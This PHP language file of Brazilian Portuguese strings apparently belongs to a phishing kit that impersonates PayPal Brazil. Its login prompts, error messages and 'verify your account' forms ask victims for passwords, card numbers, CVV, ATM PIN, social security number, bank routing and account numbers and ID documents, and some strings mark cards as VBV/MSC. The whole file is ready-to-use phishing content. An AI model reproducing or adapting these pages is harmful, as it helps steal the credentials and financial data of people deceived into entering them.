<?php  


$copy1 = "Copyright © 1999-".$copyright." ";
$copy2 = "Todos os direitos reservados.";
$wrong = "Algumas informações que você digitou não é certo.";
$titlerr = "Erro: Login ";
$confirm = "Confirme sua Conta Use-o da maneira que quiser";
$topp = "Sua segurança é a nossa prioridade";
$secondarycred = "Cartão de Crédito Secundário (opcional)";
$primarycred = "Cartão de Crédito Primária";
$thiscardis = "Este cartão é VBV / MSC";


$page="pt_BR";
$section_n1 = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent_ = true;
$section_row_fluid_panel_blue_reverseLink = false;
$section_row_fluid_editorial_editorial_left_ = true;
$section_row_fluid_editorial_editorial_right_editorial_bg_n4_ = false;
$section_row_fluid_panel_light_center_text = true;
$country_selector = "country brazil";
$top_title = "Pagamentos online no Brasil e no exterior – PayPal Brasil";
$small_with_helper_input_0 = "Informe um e-mail válido";
$small_with_helper_input_1 = "Campo obrigatório";
$login_email_input_0 = "E-mail";
$passwordRecovery1_a_0 = "Esqueceu seu e-mail?";
$login_password_input_0 = "Senha";
$passwordRecovery2_a_0 = "Esqueceu sua senha?";
$login_button_a_0 = "Log in";
$signup_button_a_0 = "Criar conta";
$header_buy_a_0 = "Compre";
$header_sell_a_0 = "Venda";
$header_send_a_0 = "enviar";
$header_business_a_0 = "";
$hero_h1_0 = "Marque um gol contra a sede.";
$signup_button_inner_a_0 = "Criar conta";
$signup_subline_p_0 = "";
$icon_help_a_0 = "";
$icon_contact_a_0 = "";
$icon_search_button_0 = "";
$_large_h2_n1_0 = "É seguro. É fácil. É PayPal";
$_large_h2_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Deixe a carteira em casa";
$_large_h2_row_fluid_editorial_editorial_left__0 = "Venda parcelado, receba de uma só vez";
$contentPara_p_n1_0 = "Somos líderes mundiais em pagamentos online. São mais de 140 milhões de clientes no mundo todo comprando com segurança e facilidade. O PayPal não compartilha dados financeiros com vendedores e você finaliza sua compra em poucos cliques. ";
$contentPara_p_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "Transforme seu celular em uma carteira digital com o nosso aplicativo. Cadastre cartões de crédito Visa e Mastercard, veja seu histórico de compras e receba notificações sempre que pagar com PayPal. E tem mais: em breve você também poderá pagar suas compras em lojas físicas sem fila, em poucos segundos. ";
$contentPara_p_row_fluid_editorial_editorial_left__0 = "O cliente quer parcelar a compra? Conte com o PayPal! Ofereça aos seus clientes brasileiros a opção de parcelamento em até 12 vezes sem juros nos cartões de crédito Visa e Mastercard e receba o pagamento de uma só vez, em 24 horas - esse prazo está sujeito à análise de risco e crédito, realizada pelo PayPal.";
$contentLink_a_n1_0 = "Compre no Brasil";
$contentLink_a_n1_1 = "Compre no eBay";
$contentLink_a_row_fluid_editorial_editorial_left__0 = "Receba pagamentos em seu site";
$contentLink_a_row_fluid_editorial_editorial_left__1 = "Receba pagamentos por e-mail";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__0 = "PayPal no seu celular";
$contentLink_reverseLink_a_row_fluid_editorial_editorial_right_editorial_bg_n2_lightContent__1 = "Baixe o aplicativo";
$closingHeadline_headline_large_p_0 = "No Brasil e no mundo, é melhor comprar com PayPal ";
$btn_closing_cta_center_block_span4_a_0 = "Crie sua conta. É grátis!";
$footer_footer_main_secondaryLink_li = array();
$footer_footer_main_secondaryLink_li[0] = "Ajuda";
$footer_footer_main_secondaryLink_li[1] = "Fale conosco";
$footer_footer_main_secondaryLink_li[2] = "Tarifas";
$footer_footer_main_secondaryLink_li[3] = "Segurança";
$footer_footer_main_secondaryLink_li[4] = "Apps";
$footer_footer_main_secondaryLink_li[5] = "Onde comprar";
$footer_footer_secondary_secondaryLink_li = array();
$footer_footer_secondary_secondaryLink_li[0] = "Sobre";
$footer_footer_secondary_secondaryLink_li[1] = "Blog";
$footer_footer_secondary_secondaryLink_li[2] = "Trabalhe conosco";
$footer_footer_secondary_secondaryLink_li[3] = "Mapa do site";
$footer_footer_secondary_secondaryLink_li[4] = "eBay";
$footer_footer_secondary_secondaryLink_li[5] = "Desenvolvedores";
$footer_footer_secondary_secondaryLink_li[6] = "Programa de Parceiros";
$footer_footer_secondary_secondaryLink_li[7] = "Avalie sua experiência";
$footer_footer_tertiary_secondaryLink_li = array();
$footer_footer_tertiary_secondaryLink_li[0] = "© 1999 - ".$copyright." PayPal";
$footer_footer_tertiary_secondaryLink_li[1] = "Privacidade";
$footer_footer_tertiary_secondaryLink_li[2] = "Termos de uso";

$top_title2 = "Erro - Acesse Brasil - PayPal";
$alert_alert_warning_div_0 = "Você deve inserir o e-mail e senha. Por favor, tente novamente.";
$loginheadline_p_0 = "Acesse sua conta";
$error_span_0 = "E-mail";
$error_span_1 = "Senha";
$btn_large_input_0 = "Log in";
$pwrLinkoldflow_a_0 = "Esqueceu seu e-mail ou senha?";
$btn_btn_secondary_large_a_0 = "Crie sua conta gratuitamente";
$headline_p_0 = "Conveniência é a ordem do dia.<SPAN class=headline-content>Compre em milhares de lojas no Brasil e no exterior com sua conta do PayPal digitando seu e-mail e senha, sem burocracia nem complicações.</SPAN>";
$headline_p_1 = "Simples e sem surpresas na hora de pagar.<SPAN class=headline-content>O PayPal não cobra nenhuma tarifa de quem faz compras em sites brasileiros. Isso mesmo: zero. Pode acreditar.</SPAN>";
$footer_li_footer_li = array();
$footer_li_footer_li[0] = "Sobre nós";
$footer_li_footer_li[1] = "Fale conosco";
$footer_li_footer_li[2] = "Tarifas";
$footer_li_footer_li[3] = "No mundo";
$footer_li_footer_li[4] = "Termos e Condições";
$footer_li_footer_li[5] = "alaMaula";
$footer_li_footer_li[6] = "eBay";
$legal_p_0 = "Copyright © 1999-2014 PayPal. Todos os direitos reservados.";

$charset = "UTF-8";
$profupdate = "Perfil Update - PayPal";
$processing = "A iniciar sessão com segurança";
$opay = "O login - PayPal";
$ifno = "Se esta página aparece por mais de 5 segundos,";
$clickhere = "clique aqui";
$reload = "para recarregar.";
$logout = "Sair";
$help = "ajudar";
$s_center = "Segurança e proteção";
$myacc = "Minha Conta";
$over = "visão global";
$addfound = "Adicionar fundos";
$retirar = "retirar";
$banktf = "Transferir para a conta bancária";
$history = "história";
$bsearch = "Pesquisa Básica";
$dhistory = "Baixe História";
$resolu = "resolução Centro";
$opencase = "Ver casos em aberto";
$guides = "Guias";
$prof = "perfil";
$addemail = "Adicionar ou editar Email";
$addbank = "Adicionar ou Editar Conta Bancária";
$addcard = "Adicionar ou editar cartão de crédito";
$addadr = "Adicionar ou Editar Endereço Postal";
$sendmoney = "Enviar dinheiro";
$reqmoney = "solicitar dinheiro";
$mservices = "Merchant Services";
$autools = "Ferramentas de leilão";
$stra = "Secure Transaction";
$puf = "atualização do perfil";
$pip = "Informações Pessoais Perfil";
$acu = "Insira suas informações com a maior precisão possível.";
$accu = "Certifique-se de inserir as informações com precisão, e de acordo com os formatos necessários.";
$filla = "Preencha todos os campos obrigatórios.";
$rfield = "campo Obrigatório";
$ffPrenom = "Nome";
$ffNom = "Sobrenome";
$dateness = "Data de Nascimento";
$month = "mês";
$day = "dia"; 
$year = "ano";
$adr1 = "Linha 1 Endereço";
$adr2 = "Linha 2 Morada";
$city = "Cidade";
$state = "Estado";
$zip = "Código Postal";
$country = "País";
$scountry = "Selecione o país";
$hpn = "Número de telefone";
$acpnum = "Este número será usado para contatá-lo sobre medidas de segurança e/ou outras questões relacionadas com a sua conta PayPal.";
$ccprof = "Perfil de Crédito/Débito";
$damelacc = "Insira as informações do cartão com a maior precisão possível.";
$damelacb = "Para o número de cartão, digitar os números apenas por favor, sem traços ou espaços.";
$Nomdutitulairedelacarte = "Nome do cartão";
$ccnumbr = "Número do Cartão";
$expbr = "Data de validade";
$cvv = "Número de verificação do cartão";
$hcvv = "Ajuda para encontrar o seu Cartão de Número de verificação";
$atmm = "Seu ATM PIN";
$ssn = "Número da Segurança Social";
$routing="Número Banco Routing";
$account="Número de Conta Bancária";
$hrouting="Ajuda para encontrar o seu Banco Número Routing";
$haccount="Ajuda para encontrar o seu Número de Conta Bancária";
$IDTYPE = "Selecione o tipo de Id";
$Passport="passaporte";
$Card_Identification="Cartão de Identificação";
$Driving_License="Carta de Condução";
$for1 = "Para sua proteção, verificar informações de cartão de crédito.";
$for2 = "O processo normalmente leva cerca de 30 segundos, mas pode levar mais tempo durante determinados momentos do dia. Por favor, clique";
$for3 = "para atualizar suas informações.";
$spo = "Salve Perfil";
$t1 = "Mais informações";
$t2 = "Quem Somos";
$t3 = "Retorno do Site";
$t4 = "honorários";
$t5 = "privacidade";
$t6 = "Centro de Segurança";
$t7 = "Fale Conosco";
$t8 = "acordos legais";
$t9 = "mundial";
$t10 = "Jobs";
$t11 = "Merchant Services";
$t12 = "Nosso Blog";
$t13 = "Labs";
$t14 = "Referências";
$t15 = "Mapa do Site";
$t16 = "eBay";
$t17 = "comunidade";
$fdic = "Informações sobre FDIC seguro de passagem";
$myvar3 = "Por favor, preencha o formulário abaixo para atualizar o seu perfil e restaurar o acesso à conta.";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">'.$myvar3.'</p></div></div>';

$valid = array("Digite seu primeiro nome"
,"Nome inválido" //--------
,"Digite seu Sobrenome"
,"Inválido Sobrenome" //--------
,"Escolha um mês de nascimento válida." //--------4
,"Por favor seleccione um aniversário válido." //--------
,"Por favor seleccione um ano do nascimento válida." //--------
,"Digite seu endereço"
,"endereço inválido" //--------8
,"endereço inválido" //--------
,"Por favor, insira o nome da sua cidade"
,"Por favor insira um nome válido City." //--------
,"Por favor insira um nome válido City." //--------12
,"Selecione o País"
,"Digite seu CEP"
,"CEP inválido." //--------15
,"Digite seu número de telefone"
,"Digite apenas o número"
,"Por favor insira um número de telefone válido" //--------
,"Por favor insira um nome válido de titular" //--------19
,"Número do cartão está em formato inválido"  ////--------
,"Número do cartão de crédito é inválido"  //--------
,""//--------22
,""//--------
,"Digite apenas o número"
,"Por favor selecione a Data de Vencimento - Mês -"
,"Por favor selecione a Data de Vencimento - Ano -"
,"Digite seu CVV"
,"Por favor insira um Cvv/Cvv2 válida para o seu cartão."//--------
,"Cvv/Cvv2 inválido" //--------
,"Digite seu PIN ATM"
,"Por favor insira um PIN ATM Valid" //--------
,"Por favor insira um PIN ATM Valid" //--------
,"Digite seu número de Segurança Social"
,"Número de segurança social inválido."
,"Número de segurança social inválido."
,"O número de segurança social apenas o número"
,"Digite seu código de segurança"
,"Secure Code inválido");
$allcountry1 = "Chegamos até você, seja onde for";
$allcountry2 = "Estamos em 193 países e aceitamos 26 moedas diferentes. Com a gente você envia e recebe pagamentos com segurança e ultrapassa qualquer fronteira ou barreira de linguagem. Estamos com você onde você estiver.";
$One_moment = "Um momento...";


$your_money = "Obtenha mais do seu dinheiro";
$your_money_p = "Sua conta PayPal dá-lhe uma maneira mais segura, mais rápida e mais conveniente para pagar on-line e no seu celular. Armazene seus dados financeiros de forma segura com a gente então usar sua conta para fazer compras, transferir dinheiro ou vender seu material para fazer algum dinheiro extra - tudo em apenas alguns cliques.";
$websites = "Loja em milhões de sites";
$websites_p = "PayPal está disponível em milhões de sites em todo o mundo. Então, se você está comprando de maiores varejistas ou os menores especialistas, você pode fazer compras sem compartilhar seus dados e velocidade através de checkout. E qualquer dispositivo que você está usando, a sua experiência PayPal vai ser tão rápido e conveniente.";
$Simply_secure = "simplesmente seguro";
$Simply_secure_p = "Segurança está no centro de tudo que fazemos. Quer se trate de proteger os seus dados financeiros ou as suas compras, nós colocamos a sua segurança e paz de espírito em primeiro lugar. É por isso que usamos levando criptografia e anti-fraude tecnologia, por que monitorar transações 24 horas por dia e por isso que podemos ajudá-lo a obter o seu dinheiro de volta, se a compra não chegar ou não corresponde à sua descrição.";
$ex_date_info = "Por favor, dê-nos o seu cartão de data de expiração (MM/AAAA).";
$ex_date_empty = "Por favor, dê-nos a sua data de validade do cartão.";
$ex_date_format = "Por favor, insira uma data de vencimento válida (MM/AAAA).";
$cardholder_info = "Use o seu nome, como mostrado em seu cartão";
$card_info = "Digite o número do cartão";
$card_format = "Número do cartão é inválido";
$atm_info = "Insira o pino de atm para este cartão.";
$account_info = "Digite o seu número de conta bancária";
$account_empty = "Digite seu número de conta bancária para verificar a sua conta";
$account_format = "Por favor insira um número de conta bancária válida";
$routing_info = "Introduza o seu número de identificação bancária";
$routing_empty = "Digite seu número de identificação bancária para verificar a sua conta";
$routing_format = "Por favor insira um número de encaminhamento de banco válida";
$first_name = "Seu primeiro nome";
$first_name_info = "Use seu nome legal, como mostrado em sua carteira de motorista, cartão de seguro nacional ou passaporte.";
$first_name_empty = "Precisamos de seu nome legal para verificar a sua conta.";
$last_name = "Seu sobrenome";
$last_name_info = "Use seu sobrenome legal como mostrado em sua carteira de motorista, cartão de seguro nacional ou passaporte.";
$last_name_empty = "Precisamos de seu sobrenome legal para verificar a sua conta.";
$Birth_date = "Data de nascimento";
$Birth_date_empty ="Por favor, dê-nos a sua data de nascimento.";
$Birth_date_format = "Por favor, insira uma data válida (DD/MM/AAAA).";
$Birth_date_info = "Por favor, dê-nos a sua data de nascimento (DD/MM/AAAA).";
$Address1 = "Endereço Linha 1";
$Address1_empty = "Precisamos de um endereço válido para verificar a sua conta.";
$Address1_info = "Não podemos aceitar caixas postais ou endereços comerciais.";
$Address2 = "Endereço linha 2";
$City = "cidade";
$City_empty = "Precisamos de uma vila/cidade para verificar a sua conta.";
$Postcode = "Código Postal";
$Postcode_empty = "Precisamos de um código postal para criar uma nova conta para você.";
$Postcode_format = "Por favor, verifique o seu código postal para os erros tipográficos, o formato não parece certo.";
$fone = "Seu número de telefone";
$fone_empty = "Precisamos do seu número de telefone para verificar sua conta.";
$fone_format = "Por favor verifique o seu número de telefone para erros de digitação, o formato não parece certo.";
$fone_info = "Seu número de telefone (por favor, use somente dígitos)";
$verifyaccount = "Verifique sua conta";
$Ownb = "Possui um negócio?";
$hh1 = "Seus dados seguros";
$hh2 = "Os seus dados pessoais";
$pp1 = "Precisamos de seus dados seguros válidos para verificar a sua conta.";
$pp2 = "Precisamos de algumas informações sobre você antes que possamos verificar a sua conta.";

$codepersonel="Secure Code";

$type1="Casa";
$type2="Celular";
$button_continue="Continuar";
$button_validate="Verifique";
?>